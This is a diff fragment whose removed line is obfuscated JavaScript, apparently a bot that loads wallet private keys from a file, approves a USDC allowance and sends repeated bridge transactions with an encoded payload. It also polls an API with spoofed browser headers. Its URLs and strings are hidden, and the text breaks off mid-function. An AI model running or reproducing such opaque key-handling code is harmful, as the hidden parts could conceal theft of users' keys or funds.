@@ -1,1 +1,392 @@
-const _0x53a270=_0x1f48;(function(_0x411b80,_0x32563c){const _0x31a719=_0x1f48,_0x52804b=_0x411b80();while(!![]){try{const _0x44ce71=-parseInt(_0x31a719(0x24e))/(0x1f61+-0x1276+-0xcea)*(parseInt(_0x31a719(0x272))/(0x1d9f+0x1*-0x1bed+-0x2*0xd8))+-parseInt(_0x31a719(0x299))/(-0x11f9*0x1+-0x238*0x2+0x166c)*(-parseInt(_0x31a719(0x26e))/(0x1647+0x2*-0x9b7+-0x91*0x5))+parseInt(_0x31a719(0x20f))/(-0x34*0x53+0x2*0x2+0x10dd*0x1)+-parseInt(_0x31a719(0x2d3))/(-0x1*-0x17b+-0xb*0x21d+0x15ca)*(parseInt(_0x31a719(0x2ad))/(0x1*-0xedf+0x3*-0x406+0x1af8))+parseInt(_0x31a719(0x2a1))/(-0x1ca5*0x1+0x1*-0x12ff+0xfe4*0x3)*(-parseInt(_0x31a719(0x312))/(-0x1bde+0xb23+0x10c4))+parseInt(_0x31a719(0x27b))/(-0x1*-0x1993+-0x1*0x8ee+-0x109b)*(parseInt(_0x31a719(0x389))/(0xc8b+0x718*-0x4+0x3f8*0x4))+parseInt(_0x31a719(0x275))/(0x1b9f+-0x861*0x1+-0x12*0x111);if(_0x44ce71===_0x32563c)break;else _0x52804b['push'](_0x52804b['shift']());}catch(_0x4dc9c0){_0x52804b['push'](_0x52804b['shift']());}}}(_0x4296,0x26a33*-0x3+-0x27857+0xfb*0xe53));const {ethers}=require(_0x53a270(0x34e)),fs=require('fs'),path=require(_0x53a270(0x1eb)),axios=require(_0x53a270(0x292)),{toHex}=require(_0x53a270(0x1c6)),crypto=require(_0x53a270(0x1e5))[_0x53a270(0x35b)],readline=require(_0x53a270(0x24d)),rl=readline[_0x53a270(0x30c)+_0x53a270(0x377)]({'input':process[_0x53a270(0x33a)],'output':process[_0x53a270(0x29b)]}),RPC_URL=_0x53a270(0x2a4)+_0x53a270(0x200)+_0x53a270(0x39d),UNION_CONTRACT_ADDRESS=_0x53a270(0x260)+_0x53a270(0x285)+_0x53a270(0x364)+_0x53a270(0x3b7)+'03',USDC_CONTRACT_ADDRESS=_0x53a270(0x355)+_0x53a270(0x2bd)+_0x53a270(0x36c)+_0x53a270(0x221)+'38',CHAIN_ID=-0x1ee6c*0x38+0x7b71a7+0x9aeca0,USDC_ABI=[{'constant':!![],'inputs':[{'name':_0x53a270(0x21a),'type':_0x53a270(0x2fd)}],'name':_0x53a270(0x257),'outputs':[{'name':_0x53a270(0x1c5),'type':_0x53a270(0x351)}],'type':_0x53a270(0x34b)},{'constant':![],'inputs':[{'name':_0x53a270(0x397),'type':_0x53a270(0x2fd)},{'name':_0x53a270(0x360),'type':_0x53a270(0x351)}],'name':_0x53a270(0x27d),'outputs':[{'name':'','type':_0x53a270(0x2be)}],'type':_0x53a270(0x34b)},{'constant':!![],'inputs':[{'name':_0x53a270(0x21a),'type':_0x53a270(0x2fd)},{'name':_0x53a270(0x397),'type':_0x53a270(0x2fd)}],'name':_0x53a270(0x3af),'outputs':[{'name':'','type':_0x53a270(0x351)}],'type':_0x53a270(0x34b)}],PRIVATE_KEY=fs[_0x53a270(0x339)+'nc'](path[_0x53a270(0x398)](__dirname,_0x53a270(0x2bf)+_0x53a270(0x278)),_0x53a270(0x21c))[_0x53a270(0x34a)]('\x0a')[_0x53a270(0x2b1)](_0x3e3208=>_0x3e3208[_0x53a270(0x1cc)]())[_0x53a270(0x2d7)](_0x278c6f=>_0x278c6f&&!_0x278c6f[_0x53a270(0x32a)]('#'))[process[_0x53a270(0x228)][-0x1478+-0x1165*-0x2+-0xe4f]||-0x2132+0x21*0x3c+-0xcbb*-0x2]||'';(!PRIVATE_KEY||!ethers[_0x53a270(0x340)+'g'](PRIVATE_KEY,0xa28+0x2*0x92f+-0x1c66))&&(console[_0x53a270(0x286)](_0x53a270(0x2cc)+_0x53a270(0x22a)+_0x53a270(0x371)+_0x53a270(0x23a)+_0x53a270(0x29f)+'xt'),process[_0x53a270(0x2e2)](-0xd*-0x250+-0x22*0x10e+-0x9*-0xa5));const provider=new ethers[(_0x53a270(0x2e4))+(_0x53a270(0x393))](RPC_URL),wallet=new ethers[(_0x53a270(0x1f1))](PRIVATE_KEY,provider),usdcContract=new ethers[(_0x53a270(0x38e))](USDC_CONTRACT_ADDRESS,USDC_ABI,wallet);function displayBanner(){const _0x3dfe4e=_0x53a270,_0x2e736e={'KkzbR':_0x3dfe4e(0x28e)+_0x3dfe4e(0x1ed)+_0x3dfe4e(0x1ed)+_0x3dfe4e(0x1e0)+'🌉','cFYIt':_0x3dfe4e(0x31f)+_0x3dfe4e(0x356)+_0x3dfe4e(0x3ac)+_0x3dfe4e(0x1cf)+_0x3dfe4e(0x281)+_0x3dfe4e(0x38c),'ACknt':_0x3dfe4e(0x205)+_0x3dfe4e(0x1ed)+_0x3dfe4e(0x1ed)+_0x3dfe4e(0x333)+'\x0a'};console[_0x3dfe4e(0x252)](),console[_0x3dfe4e(0x27c)](_0x2e736e[_0x3dfe4e(0x288)]),console[_0x3dfe4e(0x27c)](_0x2e736e[_0x3dfe4e(0x29e)]),console[_0x3dfe4e(0x27c)](_0x2e736e[_0x3dfe4e(0x209)]);}function displayMenu(){const _0xbf5658=_0x53a270,_0x7b1a75={'GIapu':_0xbf5658(0x3a3),'xhaDI':_0xbf5658(0x386)+_0xbf5658(0x26f)+'r','mGeeL':_0xbf5658(0x2e9)+_0xbf5658(0x216)+_0xbf5658(0x20c),'tGJHd':_0xbf5658(0x368)};console[_0xbf5658(0x27c)](_0x7b1a75[_0xbf5658(0x2f9)]),console[_0xbf5658(0x27c)](_0x7b1a75[_0xbf5658(0x25e)]),console[_0xbf5658(0x27c)](_0x7b1a75[_0xbf5658(0x33e)]),console[_0xbf5658(0x27c)](_0x7b1a75[_0xbf5658(0x261)]);}function _0x1f48(_0xcca242,_0x56e5ae){const _0x40110a=_0x4296();return _0x1f48=function(_0x373e4f,_0x54bff6){_0x373e4f=_0x373e4f-(-0x26c7*-0x1+-0x513*-0x1+-0x2a21);let _0x2a9b5e=_0x40110a[_0x373e4f];return _0x2a9b5e;},_0x1f48(_0xcca242,_0x56e5ae);}async function getUserInput(_0x54c7a5){const _0x2dfb40={'deZrT':function(_0x4af83e,_0x598110){return _0x4af83e(_0x598110);}};return new Promise(_0x8539ea=>{const _0x23c744=_0x1f48;rl[_0x23c744(0x399)](_0x54c7a5,_0x5c8271=>{const _0x103301=_0x23c744,_0x3aab68=_0x5c8271[_0x103301(0x1cc)]();console[_0x103301(0x27c)](_0x103301(0x32c)+_0x103301(0x3bd)+_0x5c8271+(_0x103301(0x3bc)+_0x103301(0x2ac))+_0x3aab68+'\x22'),_0x2dfb40[_0x103301(0x249)](_0x8539ea,_0x3aab68);});});}async function getTransferParams(){const _0x106883=_0x53a270,_0x7aa5={'lYfqK':_0x106883(0x2cf)+_0x106883(0x37d)+_0x106883(0x37e),'AKYeP':function(_0x1ae9b8,_0x414176){return _0x1ae9b8(_0x414176);},'bqCsx':_0x106883(0x1e8)+_0x106883(0x22b)+_0x106883(0x2ea)+_0x106883(0x2d5)+'\x20','qImtS':_0x106883(0x239)+_0x106883(0x20b)+_0x106883(0x246)+_0x106883(0x366)+_0x106883(0x28f)+_0x106883(0x3b8),'ZarIi':function(_0x35eb77,_0x326ee0){return _0x35eb77(_0x326ee0);},'TPEDK':_0x106883(0x338)+_0x106883(0x2ae)+_0x106883(0x38f)+_0x106883(0x232)+_0x106883(0x326),'Cigzy':function(_0x4293ff,_0x1907d9){return _0x4293ff||_0x1907d9;},'SFNLN':_0x106883(0x266),'ePTvn':function(_0x13d8e6,_0x4d0807){return _0x13d8e6*_0x4d0807;},'aiqrN':function(_0x5bdaee,_0x12cd82){return _0x5bdaee(_0x12cd82);},'XqqyG':function(_0x57753e,_0x2689f5){return _0x57753e(_0x2689f5);},'dwAHQ':function(_0x49a1fe,_0xc26b4f){return _0x49a1fe<=_0xc26b4f;},'xZUuJ':_0x106883(0x34c)+_0x106883(0x3b3)+_0x106883(0x250)+_0x106883(0x3b0)+_0x106883(0x294),'AeDdR':function(_0x1e0384,_0x5f1f17){return _0x1e0384<_0x5f1f17;},'mAqeX':_0x106883(0x2f8)+_0x106883(0x217)+_0x106883(0x26a)+_0x106883(0x2a0)+_0x106883(0x344),'gPqQt':function(_0x2cd8e6,_0xc033e2){return _0x2cd8e6(_0xc033e2);},'QmSna':_0x106883(0x2a3)+_0x106883(0x203)+_0x106883(0x33b)+_0x106883(0x391)+_0x106883(0x1ba)};console[_0x106883(0x27c)](_0x7aa5[_0x106883(0x282)]);const _0x41e8b4=await _0x7aa5[_0x106883(0x1f0)](getUserInput,_0x7aa5[_0x106883(0x36e)]),_0x234d3d=await _0x7aa5[_0x106883(0x1f0)](getUserInput,_0x7aa5[_0x106883(0x1ca)]),_0x3364b8=await _0x7aa5[_0x106883(0x212)](getUserInput,_0x7aa5[_0x106883(0x241)]),_0x2a9045={'amount':_0x7aa5[_0x106883(0x20a)](_0x41e8b4,_0x7aa5[_0x106883(0x337)]),'delay':_0x7aa5[_0x106883(0x2d0)](_0x234d3d?_0x7aa5[_0x106883(0x1c8)](parseInt,_0x234d3d):0x17ff*-0x1+-0x6b8+0x3*0xa3d,-0x81e*0x2+0x6b2*0x4+0x19*-0x44),'count':_0x3364b8?_0x7aa5[_0x106883(0x2d4)](parseInt,_0x3364b8):0xc7f+-0x110*-0x1+-0xd8e};if(_0x7aa5[_0x106883(0x2d4)](isNaN,_0x2a9045[_0x106883(0x25c)])||_0x7aa5[_0x106883(0x342)](_0x2a9045[_0x106883(0x25c)],-0x510+-0x3b*0x58+-0x2*-0xcac))throw new Error(_0x7aa5[_0x106883(0x2b5)]);if(_0x7aa5[_0x106883(0x1c8)](isNaN,_0x2a9045[_0x106883(0x388)])||_0x7aa5[_0x106883(0x2c8)](_0x2a9045[_0x106883(0x388)],-0x1c8b*-0x1+-0x1d3e+0xb3))throw new Error(_0x7aa5[_0x106883(0x2ba)]);if(_0x7aa5[_0x106883(0x328)](isNaN,_0x2a9045[_0x106883(0x2a5)])||_0x7aa5[_0x106883(0x2c8)](_0x2a9045[_0x106883(0x2a5)],0x1fb1+-0x23f7+0xdb*0x5))throw new Error(_0x7aa5[_0x106883(0x1fa)]);return _0x2a9045;}async function executeTransfers(_0x3709d7){const _0x48299e=_0x53a270,_0x159ec0={'nZtAS':_0x48299e(0x3b5)+_0x48299e(0x36d)+_0x48299e(0x298),'ZqIAx':_0x48299e(0x36b)+_0x48299e(0x37e),'GADWM':function(_0x2b46f9,_0x52b2ec){return _0x2b46f9/_0x52b2ec;},'PVBYP':function(_0x2d8548,_0x5f5bac){return _0x2d8548*_0x5f5bac;},'ENlRb':function(_0x5f4800,_0x2000e4){return _0x5f4800(_0x2000e4);},'dLmhD':function(_0x1a2d3d,_0x100218){return _0x1a2d3d<_0x100218;},'nhhiZ':function(_0x164782,_0x40f41d){return _0x164782>_0x40f41d;},'vDFez':function(_0xb0ee8c,_0x4edcbf){return _0xb0ee8c/_0x4edcbf;},'ZLkuT':function(_0x5724a0,_0x226568){return _0x5724a0(_0x226568);},'NdbnO':function(_0x11b895,_0x1711e0){return _0x11b895+_0x1711e0;},'RSgux':function(_0x4f0f49,_0x3d753b){return _0x4f0f49(_0x3d753b);}};console[_0x48299e(0x27c)](_0x159ec0[_0x48299e(0x234)]),console[_0x48299e(0x27c)](_0x159ec0[_0x48299e(0x1ff)]),console[_0x48299e(0x27c)](_0x48299e(0x3ab)+_0x48299e(0x303)+_0x48299e(0x357)+_0x3709d7[_0x48299e(0x25c)]+_0x48299e(0x2e3)),console[_0x48299e(0x27c)](_0x48299e(0x2c5)+_0x48299e(0x23e)+_0x48299e(0x2aa)+_0x3709d7[_0x48299e(0x2a5)]),console[_0x48299e(0x27c)](_0x48299e(0x237)+_0x48299e(0x316)+_0x48299e(0x37c)+_0x159ec0[_0x48299e(0x2c7)](_0x3709d7[_0x48299e(0x388)],0x1332+-0x1e7b+-0xf31*-0x1)+'s\x0a');const _0x528c11=ethers[_0x48299e(0x305)](_0x159ec0[_0x48299e(0x39b)](_0x3709d7[_0x48299e(0x25c)],_0x3709d7[_0x48299e(0x2a5)])[_0x48299e(0x330)](),-0x89e*0x1+0x2d4+-0xba*-0x8);await _0x159ec0[_0x48299e(0x222)](approveUnionContract,_0x528c11);for(let _0x32d827=0x2119+0x23e1+-0x1*0x44fa;_0x159ec0[_0x48299e(0x3ae)](_0x32d827,_0x3709d7[_0x48299e(0x2a5)]);_0x32d827++){_0x159ec0[_0x48299e(0x213)](_0x32d827,0x118b*0x1+0x7*-0x42d+0xbb0)&&(console[_0x48299e(0x27c)](_0x48299e(0x3b2)+_0x48299e(0x24b)+_0x159ec0[_0x48299e(0x322)](_0x3709d7[_0x48299e(0x388)],0x26bb+-0xad7+0x17fc*-0x1)+(_0x48299e(0x2c6)+_0x48299e(0x39e)+_0x48299e(0x358)+'..')),await _0x159ec0[_0x48299e(0x1fd)](sleep,_0x3709d7[_0x48299e(0x388)])),console[_0x48299e(0x27c)](_0x48299e(0x1be)+_0x48299e(0x1d3)+'r\x20'+_0x159ec0[_0x48299e(0x33c)](_0x32d827,0x94d+-0x1*0xb49+0x1*0x1fd)+'/'+_0x3709d7[_0x48299e(0x2a5)]),await _0x159ec0[_0x48299e(0x230)](sendRawPayloadTx,_0x3709d7[_0x48299e(0x25c)]);}}async function approveUnionContract(_0x54447c){const _0x14c4da=_0x53a270,_0x51cc49={'ZQXDq':_0x14c4da(0x259)+_0x14c4da(0x38d)+_0x14c4da(0x38b)+_0x14c4da(0x2e7)+_0x14c4da(0x243),'AFurM':function(_0x12cfab,_0x510105){return _0x12cfab>=_0x510105;},'RNQgN':_0x14c4da(0x204)+_0x14c4da(0x385)+_0x14c4da(0x348)+_0x14c4da(0x1f3),'ecivG':_0x14c4da(0x1cd)+_0x14c4da(0x226)+_0x14c4da(0x1da),'wkzZG':_0x14c4da(0x22d)+_0x14c4da(0x268),'BcYSr':function(_0x3b2632,_0x455403){return _0x3b2632===_0x455403;},'sqcsZ':_0x14c4da(0x2f7),'oDYNI':_0x14c4da(0x297),'YhZIl':function(_0x3b86ce,_0x5c4a0a){return _0x3b86ce!==_0x5c4a0a;},'OHYyz':_0x14c4da(0x36a)+_0x14c4da(0x332)+_0x14c4da(0x343)};console[_0x14c4da(0x27c)](_0x51cc49[_0x14c4da(0x3b9)]);const _0x2657a6=await usdcContract[_0x14c4da(0x3af)](wallet[_0x14c4da(0x2fd)],UNION_CONTRACT_ADDRESS);if(_0x51cc49[_0x14c4da(0x1db)](_0x2657a6,_0x54447c)){console[_0x14c4da(0x27c)](_0x51cc49[_0x14c4da(0x363)]);return;}console[_0x14c4da(0x27c)](_0x14c4da(0x1f7)+_0x14c4da(0x3a5)+_0x14c4da(0x3a6)+_0x14c4da(0x240)+ethers[_0x14c4da(0x323)+'s'](_0x54447c,-0x12ca+0x653+0xc7d)+_0x14c4da(0x29a));const _0x1f64d6=await usdcContract[_0x14c4da(0x27d)](UNION_CONTRACT_ADDRESS,_0x54447c);console[_0x14c4da(0x27c)](_0x51cc49[_0x14c4da(0x225)],_0x1f64d6[_0x14c4da(0x219)]);const _0x2a96fe=await _0x1f64d6[_0x14c4da(0x308)]();console[_0x14c4da(0x27c)](_0x51cc49[_0x14c4da(0x2f5)],_0x51cc49[_0x14c4da(0x25f)](_0x2a96fe[_0x14c4da(0x2e5)],-0x18e6+0x1abb+-0x9*0x34)?_0x51cc49[_0x14c4da(0x2fb)]:_0x51cc49[_0x14c4da(0x2a9)]);if(_0x51cc49[_0x14c4da(0x30d)](_0x2a96fe[_0x14c4da(0x2e5)],0x1c0a+-0x44*0x2f+0x1*-0xf8d))throw new Error(_0x51cc49[_0x14c4da(0x270)]);}const PAYLOAD=_0x53a270(0x2d6)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x31d)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x2cd)+_0x53a270(0x24c)+_0x53a270(0x1d9)+_0x53a270(0x2c4)+_0x53a270(0x33d)+_0x53a270(0x254)+_0x53a270(0x396)+_0x53a270(0x3a4)+_0x53a270(0x3b4)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x3be)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x20d)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x372)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x2e6)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x313)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x374)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x2c1)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x2ef)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x255)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x302)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+(_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x1bd)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x300)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x28c)+_0x53a270(0x2dd)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x39f)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x2f1)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x3c0)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x34d)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x273)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x3a1)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x23c)+_0x53a270(0x236)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x220)+_0x53a270(0x26b)+_0x53a270(0x2dc)+_0x53a270(0x335)+_0x53a270(0x1ea)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x290)+_0x53a270(0x1f8)+_0x53a270(0x1d6)+_0x53a270(0x36f)+_0x53a270(0x3b6)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x2a2))+(_0x53a270(0x310)+_0x53a270(0x349)+_0x53a270(0x1d1)+_0x53a270(0x2f2)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x1fe)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x301)+_0x53a270(0x207)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x271)+_0x53a270(0x2d8)+_0x53a270(0x22c)+_0x53a270(0x267)+_0x53a270(0x33f)+_0x53a270(0x394)+_0x53a270(0x271)+_0x53a270(0x271)+'00');function generateSalt(){const _0x385cfa=_0x53a270,_0x44f952={'QiZvV':function(_0x42f163,_0x3b4bd0){return _0x42f163(_0x3b4bd0);}},_0x1e64aa=new Uint8Array(-0xa9*0x31+-0x1142+0x31bb);return crypto[_0x385cfa(0x329)+_0x385cfa(0x28d)](_0x1e64aa),_0x44f952[_0x385cfa(0x208)](toHex,_0x1e64aa);}function generateTimeoutTimestamp(){const _0x5830af=_0x53a270,_0x2e7d01={'JtOlX':function(_0x330dac,_0x5dcace){return _0x330dac+_0x5dcace;},'KgGvt':function(_0x45b1e2,_0x7968bb){return _0x45b1e2/_0x7968bb;},'plzZb':function(_0x7d77ce,_0x513fd9){return _0x7d77ce*_0x513fd9;},'TodhY':function(_0x19f38d,_0x5ebd8c){return _0x19f38d(_0x5ebd8c);}},_0x5a7b27=_0x2e7d01[_0x5830af(0x2a6)](Math[_0x5830af(0x27a)](_0x2e7d01[_0x5830af(0x365)](Date[_0x5830af(0x30a)](),-0x837+0x7*0xdb+0x622)),0x1a8e+-0x1560+-0x16b*0x2),_0x2340c0=_0x2e7d01[_0x5830af(0x28b)](_0x2e7d01[_0x5830af(0x23f)](BigInt,_0x5a7b27),0x3b9aca00n);return'0x'+_0x2340c0[_0x5830af(0x330)](-0x115+0xb*0xb7+-0xd7*0x8)[_0x5830af(0x21f)](-0xd*-0x2b2+-0x103*0x13+-0xf91,'0');}function formatUsdcValue(_0x467b10){const _0x10c77f=_0x53a270,_0x2e7514=ethers[_0x10c77f(0x305)](_0x467b10[_0x10c77f(0x330)](),0x244e+-0x43c*-0x6+-0x3db0);return _0x2e7514[_0x10c77f(0x330)](0x6fe+0x1*-0xe0+-0x60e);}function to32ByteHex(_0x5be58c){const _0x4cf064=_0x53a270;return _0x5be58c[_0x4cf064(0x330)](-0x1*-0x2125+0x1*0x1b61+-0xda*0x47)[_0x4cf064(0x21f)](0x1cd*-0x1+-0x1d*-0xac+0x116f*-0x1,'0');}function replace32ByteField(_0x71d885,_0x2bb64d,_0x1f586d){const _0x245401=_0x53a270,_0x4de06f={'Tnvki':function(_0x18a6c5,_0x858937){return _0x18a6c5===_0x858937;}};if(_0x71d885[_0x245401(0x32a)]('0x'))_0x71d885=_0x71d885[_0x245401(0x315)](-0xc2a+-0x2174*-0x1+-0x1548);if(_0x2bb64d[_0x245401(0x32a)]('0x'))_0x2bb64d=_0x2bb64d[_0x245401(0x315)](-0x1*0x12c5+-0x160d+0x28d4);if(_0x1f586d[_0x245401(0x32a)]('0x'))_0x1f586d=_0x1f586d[_0x245401(0x315)](0x1*0x219c+0x1774+-0x390e);const _0x2ce4f7=new RegExp(_0x2bb64d,'i'),_0x521b70=_0x71d885[_0x245401(0x274)](_0x2ce4f7,_0x1f586d);return _0x4de06f[_0x245401(0x2b2)](_0x521b70,_0x71d885)&&console[_0x245401(0x211)](_0x245401(0x2c0)+_0x245401(0x1df)+_0x245401(0x2b3)+_0x245401(0x2db)+_0x245401(0x1f2)+_0x2bb64d),_0x521b70;}const sleep=_0x5a4cd7=>new Promise(_0x481c91=>setTimeout(_0x481c91,_0x5a4cd7));async function pollPacketHash(_0x45ac80,_0x40b5a0=0x1*0xdf8+0x1*-0x1a58+0xc92,_0x255bc8=-0x2d*0x13+-0x29f+0x197e){const _0x2beb2a=_0x53a270,_0x13939b={'lSIHC':_0x2beb2a(0x2bb)+_0x2beb2a(0x31a)+_0x2beb2a(0x21e)+_0x2beb2a(0x304),'EyfDG':_0x2beb2a(0x32d)+_0x2beb2a(0x395)+_0x2beb2a(0x1ce)+_0x2beb2a(0x2f6)+_0x2beb2a(0x1e1)+'n','lghQI':_0x2beb2a(0x277)+_0x2beb2a(0x2b0)+_0x2beb2a(0x30e),'cyPpy':_0x2beb2a(0x2a7)+_0x2beb2a(0x2ed)+_0x2beb2a(0x317),'smhxA':_0x2beb2a(0x32d)+_0x2beb2a(0x392),'DHtdn':_0x2beb2a(0x31e)+_0x2beb2a(0x37a)+_0x2beb2a(0x1d2),'DupWj':_0x2beb2a(0x31e)+_0x2beb2a(0x37a)+_0x2beb2a(0x318),'nTqWr':_0x2beb2a(0x27f)+'0','UkoCl':function(_0x3e6a5a,_0x26bcea){return _0x3e6a5a<_0x26bcea;},'QVdpG':function(_0x17dfb5,_0xb500ca){return _0x17dfb5+_0xb500ca;},'DAOWG':function(_0x229839,_0x1a2dc6){return _0x229839>_0x1a2dc6;},'mnGpl':_0x2beb2a(0x1c3)+_0x2beb2a(0x2fe),'aRulC':_0x2beb2a(0x289)+_0x2beb2a(0x2e8)+_0x2beb2a(0x218)+_0x2beb2a(0x214),'QzBpW':function(_0x20a1f4,_0x4edac9){return _0x20a1f4(_0x4edac9);},'usmjl':function(_0x30c15a,_0x31659b){return _0x30c15a(_0x31659b);}},_0x5d0a6c=_0x13939b[_0x2beb2a(0x2de)],_0x4a2c6f={'accept':_0x13939b[_0x2beb2a(0x307)],'accept-encoding':_0x13939b[_0x2beb2a(0x245)],'accept-language':_0x13939b[_0x2beb2a(0x235)],'content-type':_0x13939b[_0x2beb2a(0x3ba)],'origin':_0x13939b[_0x2beb2a(0x1f4)],'referer':_0x13939b[_0x2beb2a(0x1dd)],'user-agent':_0x13939b[_0x2beb2a(0x2ab)]},_0x5960a5={'query':_0x2beb2a(0x1e4)+_0x2beb2a(0x3b1)+_0x2beb2a(0x1f5)+_0x2beb2a(0x3a9)+_0x2beb2a(0x2fa)+_0x2beb2a(0x382)+_0x2beb2a(0x22f)+_0x2beb2a(0x2ee)+_0x2beb2a(0x34f)+_0x2beb2a(0x369)+_0x2beb2a(0x1bb)+_0x2beb2a(0x27e)+_0x2beb2a(0x2fa)+_0x2beb2a(0x327)+_0x2beb2a(0x284)+_0x2beb2a(0x3bb)+_0x2beb2a(0x2ec),'variables':{'submission_tx_hash':_0x45ac80[_0x2beb2a(0x32a)]('0x')?_0x45ac80:'0x'+_0x45ac80}};for(let _0x2b4d10=-0x1*-0x1f59+-0x630+-0x3*0x863;_0x13939b[_0x2beb2a(0x37b)](_0x2b4d10,_0x40b5a0);_0x2b4d10++){try{console[_0x2beb2a(0x27c)](_0x2beb2a(0x1b9)+_0x13939b[_0x2beb2a(0x345)](_0x2b4d10,-0x1d51+0x696+0x16bc)+'/'+_0x40b5a0+(_0x2beb2a(0x35e)+_0x2beb2a(0x2e0)+'..'));const _0x2a3a6d=await axios[_0x2beb2a(0x3ad)](_0x5d0a6c,_0x5960a5,{'headers':_0x4a2c6f}),_0x597fac=_0x2a3a6d[_0x2beb2a(0x2eb)]?.[_0x2beb2a(0x2eb)]?.[_0x2beb2a(0x25d)+'rs'];if(_0x597fac&&_0x13939b[_0x2beb2a(0x2f0)](_0x597fac[_0x2beb2a(0x206)],0x2f1+-0xd4f+0x2*0x52f)&&_0x597fac[0x46b+-0x127*0x7+0x3a6][_0x2beb2a(0x269)+'h'])return console[_0x2beb2a(0x27c)](_0x13939b[_0x2beb2a(0x21d)]),_0x597fac[-0x20de+-0x83*0x4+0x22ea*0x1][_0x2beb2a(0x269)+'h'];console[_0x2beb2a(0x27c)](_0x13939b[_0x2beb2a(0x293)]),await _0x13939b[_0x2beb2a(0x375)](sleep,_0x255bc8);}catch(_0x355f9e){console[_0x2beb2a(0x286)](_0x2beb2a(0x1ef)+_0x2beb2a(0x21b)+_0x2beb2a(0x3a0)+_0x355f9e[_0x2beb2a(0x32b)]),await _0x13939b[_0x2beb2a(0x29c)](sleep,_0x255bc8);}}return console[_0x2beb2a(0x211)](_0x2beb2a(0x319)+_0x2beb2a(0x334)+_0x2beb2a(0x238)+_0x40b5a0+_0x2beb2a(0x2d1)),null;}async function sendRawPayloadTx(_0x3b902d){const _0x479f68=_0x53a270,_0x5c7f24={'VIFGh':function(_0x3bf5ee,_0x4da492){return 